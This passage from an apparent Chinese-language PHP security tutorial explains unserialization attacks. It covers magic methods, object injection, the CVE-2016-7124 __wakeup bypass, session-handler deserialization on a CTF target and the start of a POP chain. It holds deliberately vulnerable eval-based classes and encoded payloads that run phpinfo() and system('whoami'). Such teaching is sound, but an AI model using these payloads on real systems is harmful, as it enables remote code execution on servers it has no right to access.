class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:1:"A":2:{s:4:"name";s:7:"fanxing";s:3:"age";s:2:"20";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>打印出Skill方法中的值</p><p><code>My name is fanxing,I am is 20 years old!</code></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象销毁调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象字符串调用"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象以函数调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"序列化被调用&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"反序列化被调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里我们打印下序列化结果，发现属性的长度是7。</p><pre><code>O:1:&quot;A&quot;:1:{s:7:&quot;Aname&quot;;N;}</code></pre><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><pre><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</code></pre><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><pre><code>O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><pre><code>PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10</code></pre><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><pre><code>O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</code></pre><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'fanxing'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当session.serialize_handler为php的时候，存储的session结果为</p><pre><code>name|s:7:&quot;fanxing&quot;;</code></pre><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><pre><code>a:1:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;}</code></pre><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><pre><code>二进制字符串names:7:&quot;fanxing&quot;</code></pre><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><pre><code>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</code></pre><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'sessiontest.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="<span class="token prolog">&lt;?php echo ini_get("session.upload_progress.name"); ?></span>" value="123" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string">'print_r(dirname(__FILE__));'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$repl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token variable">$repl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">,</span> <span class="token variable">$endl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$format</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里装入LogWriter_File对象</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$writer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这里偷梁换柱Song的log</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Song</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$group</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$group</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token operator">=</span> <span class="token variable">$group</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$fltr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token string">"/\[i\](.*)\[\/i\]/i"</span><span class="token punctuation">,</span> <span class="token string">"&lt;i>\\1&lt;/i>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">"song_views"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$fltr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;a href='"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>url <span class="token 